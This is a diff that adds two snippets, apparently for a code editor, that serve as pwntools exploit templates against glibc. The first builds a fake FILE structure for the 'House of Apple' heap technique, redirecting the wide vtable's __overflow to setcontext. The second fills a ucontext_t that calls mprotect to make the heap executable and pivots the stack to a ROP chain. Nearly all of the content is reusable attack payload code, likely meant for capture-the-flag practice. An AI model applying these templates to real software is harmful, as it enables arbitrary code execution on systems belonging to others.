@@ -12,6 +12,55 @@
 	// 	],
 	// 	"description": "Log output to console"
 	// }
+	"house-of-apple fake FILE": {
+		"prefix": "hoa",
+		"body": [
+			"# mode > 0",
+			"# fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base",
+			"# fp->_vtable_offset = 0",
+			"fake_FILE = flat([",
+			"	# _flags, and _IO_read_ptr are chunk.prev_size and chunk.size",
+			"	0, 0, # _IO_read_ptr, _IO_read_end, _IO_read_base",
+			"	0, # _IO_write_base",
+			"	addr_ucontext, # RDX = _IO_write_ptr,",
+			"	2, # _ _IO_write_end",
+			"	[0] * 6, ",
+			"	0, # +0x68, _chain",
+			"	[0] * 6, ",
+			"	_wide_data, # +0xa0: _wide_data = fake_FILE+8",
+			"	[0] * 3, ",
+			"	1, # +0xc0: _mode",
+			"	[0] * 2, ",
+			"	_IO_wfile_jumps + 0x30, # +0xd8: RAX = _vtable",
+			"	# fake_FILE end, but fake_IO_wide_data still have some members.",
+			"	0,",
+			"	_wide_vtable,   # +0xe8 == fake_wide_data + 0xe0, _wide_vtable",
+			"	setcontext,     # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__overflow",
+			"])",
+		]
+	},
+	"build ucontext_t obj": {
+		"prefix": "ucontext",
+		"body": [
+			"ucontext = flat({",
+			"	0x28: 0,          # +0x28: r8",
+			"	0x30: 0,          # +0x30: r9",
+			"	0x48: 0,          # +0x48: r12",
+			"	0x50: 0,          # +0x50: r13",
+			"	0x58: 0,          # +0x58: r14",
+			"	0x60: 0,          # +0x60: r15",
+			"	0x68: heap_base,  # +0x68: rdi",
+			"	0x70: 0x21000,    # +0x70: rsi",
+			"	0x78: 0,          # +0x78: rbp",
+			"	0x80: 0,          # +0x80: rbx",
+			"	0x88: 7,          # +0x88: rdx",
+			"	0x98: 0,          # +0x98: rcx",
+			"	0xa0: addr_rop,   # +0xa0: rsp ",
+			"	0xa8: mprotect    # +0xa8: rip",
+			"})",
+			"assert(len(ucontext) == 0xb0)",
+		]
+	},
 	"create io": {
 		"prefix": "gio",
 		"body": [
